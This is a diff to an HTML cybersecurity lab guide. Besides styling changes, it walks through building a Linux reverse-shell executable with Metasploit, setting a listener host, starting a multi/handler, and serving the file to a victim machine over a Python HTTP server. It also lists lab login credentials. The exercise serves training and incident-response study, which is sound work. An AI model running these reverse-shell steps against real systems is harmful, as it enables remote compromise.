@@ -227,6 +227,16 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 
 html[data-present="on"] .container > .callout{display:none!important}
 html[data-present="on"][data-pm-index="0"] .container > .callout{display:block!important}
+
+.onmachine{display:flex;align-items:center;gap:.5rem;margin:1.1rem 0 .55rem;padding:.42rem .7rem;
+  border-left:4px solid var(--brand);background:color-mix(in srgb,var(--brand) 14%,transparent);
+  border-radius:9px;font-weight:800;font-size:.86rem;letter-spacing:.02em;color:var(--text)}
+.onmachine .vm-ico{font-size:1.02rem;line-height:1}
+.onmachine[data-vm="SecOnion"]{border-left-color:var(--accent);background:color-mix(in srgb,var(--accent) 14%,transparent)}
+.onmachine[data-vm="WinOS"]{border-left-color:var(--warn);background:color-mix(in srgb,var(--warn) 14%,transparent)}
+.onmachine[data-vm="UbuntuSRV"]{border-left-color:#b48cff;background:color-mix(in srgb,#b48cff 16%,transparent)}
+.onmachine[data-vm="OpenSUSE"]{border-left-color:#35c6b4;background:color-mix(in srgb,#35c6b4 16%,transparent)}
+.onmachine[data-vm="pfSense"]{border-left-color:var(--danger);background:color-mix(in srgb,var(--danger) 14%,transparent)}
 </style>
 </head>
 <body>
@@ -315,6 +325,7 @@ html[data-present="on"][data-pm-index="0"] .container > .callout{display:block!i
 <div class="subsection"><span class="phase-tag">Task 1</span><h3>Build Malicious Executables to Attack a Remote System</h3>
 </div>
 <div class="subsection"><span class="phase-tag">Task 1.1</span><h3>Build Malicious Linux Executable</h3>
+<div class="onmachine" data-vm="Kali"><span class="vm-ico" aria-hidden="true">🐉</span>On Kali</div>
 <div class="step"><p><span class="snum">1</span> Launch the Kali virtual machine to access the graphical login screen.</p>
 </div>
 <div class="step"><p><span class="snum">2</span> Log in as username kali with kali as the password.</p>
@@ -323,9 +334,9 @@ html[data-present="on"][data-pm-index="0"] .container > .callout{display:block!i
 </div>
 <div class="step"><p><span class="snum">4</span> For the purpose of learning how to build a malicious Linux executable file and incidence response, we will ignore the social engineering process. Now, let's build a malicious Linux executable. First, we will create a directory to place the executable in. In the Terminal window, type the command mkdir malicious and then press Enter. Then, cd malicious to go into the directory.</p>
 </div>
-<div class="step"><p><span class="snum">5</span> While inside the malicious directory, type and run the command msfconsole to start Metasploit. kali@kali $ msfconsole</p>
+<div class="step"><p><span class="snum">5</span> While inside the malicious directory, type and run the command msfconsole to start Metasploit.</p><div class="code-block"><span class="pr">kali@kali$</span> msfconsole</div>
 </div>
-<div class="step"><p><span class="snum">6</span> Type the following command to search for the payload for the 64-bit Linux operating system. kali@kali $ search linux/x64/shell_reverse_tcp</p>
+<div class="step"><p><span class="snum">6</span> Type the following command to search for the payload for the 64-bit Linux operating system.</p><div class="code-block"><span class="pr">kali@kali$</span> search linux/x64/shell_reverse_tcp</div>
 </div>
 <div class="step"><p><span class="snum">7</span> Type use 0 to use the payload. Notice the prompt now says payload(linux/x64/shell_reverse_tcp). This indicates that we are using this payload now.</p>
 <div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Incident staged.</span> the Metasploit session (the compromise).</span></div>
@@ -334,11 +345,11 @@ html[data-present="on"][data-pm-index="0"] .container > .callout{display:block!i
 </div>
 <div class="step"><p><span class="snum">9</span> Type command set LHOST 203.0.113.2 to set the local listen address.</p>
 </div>
-<div class="step"><p><span class="snum">10</span> With everything set and ready, let's create the malicious executable. Type the command below: kali@kali $ generate -f elf -o linux</p>
+<div class="step"><p><span class="snum">10</span> With everything set and ready, let's create the malicious executable. Type the command below:</p><div class="code-block"><span class="pr">kali@kali$</span> generate -f elf -o linux</div>
 </div>
-<div class="step"><p><span class="snum">11</span> A file named linux is created inside the malicious directory. Before we offer the malicious executable to the victim, let's prepare a listener first. In your Metasploit console, type the command below to use a handler. kali@kali $ use exploit/multi/handler</p>
+<div class="step"><p><span class="snum">11</span> A file named linux is created inside the malicious directory. Before we offer the malicious executable to the victim, let's prepare a listener first. In your Metasploit console, type the command below to use a handler.</p><div class="code-block"><span class="pr">kali@kali$</span> use exploit/multi/handler</div>
 </div>
-<div class="step"><p><span class="snum">12</span> Notice from the last step, it prompted that the payload is defaulting to generic/shell_reverse_tcp. This payload will not handle our linux reverse shell, so let's change it by entering the following command: kali@kali $ set payload linux/x64/shell_reverse_tcp</p>
+<div class="step"><p><span class="snum">12</span> Notice from the last step, it prompted that the payload is defaulting to generic/shell_reverse_tcp. This payload will not handle our linux reverse shell, so let's change it by entering the following command:</p><div class="code-block"><span class="pr">kali@kali$</span> set payload linux/x64/shell_reverse_tcp</div>
 </div>
 <div class="step"><p><span class="snum">13</span> Once again, we will check the options. Notice the payload is correct now, but we still need to change the LHOST.</p>
 </div>
@@ -356,10 +367,11 @@ html[data-present="on"][data-pm-index="0"] .container > .callout{display:block!i
 </div>
 <div class="step"><p><span class="snum">3</span> Type ls -l to check the content in the malicious directory. Make sure the linux file is present.</p>
 </div>
-<div class="step"><p><span class="snum">4</span> Now everything is ready, let's start a simple HTTP server using the Python3 module. Type the following command to start the HTTP server. kali@kali $ python3 -m http.server</p>
+<div class="step"><p><span class="snum">4</span> Now everything is ready, let's start a simple HTTP server using the Python3 module. Type the following command to start the HTTP server.</p><div class="code-block"><span class="pr">kali@kali$</span> python3 -m http.server</div>
 </div>
 </div>
 <div class="subsection"><span class="phase-tag">Task 1.3</span><h3>Using the Metasploit Handler</h3>
+<div class="onmachine" data-vm="UbuntuSRV"><span class="vm-ico" aria-hidden="true">🖧</span>On UbuntuSRV</div>
 <div class="step"><p><span class="snum">1</span> Launch the UbuntuSRV virtual machine to access the graphical login screen.</p>
 </div>
 <div class="step"><p><span class="snum">2</span> Log in as sysadmin with NDGlabpass123! as the password.</p>
